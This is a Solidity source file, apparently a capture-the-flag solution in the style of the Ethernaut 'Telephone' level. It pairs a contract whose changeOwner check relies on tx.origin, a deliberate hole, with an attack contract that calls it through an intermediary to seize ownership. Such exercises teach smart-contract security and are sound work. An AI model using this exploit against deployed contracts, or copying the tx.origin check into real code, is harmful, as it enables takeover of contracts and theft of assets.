// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone2 {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {

  Telephone2 public telephone;

  constructor(address _telephone) public {
    telephone = Telephone2(_telephone);
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }

}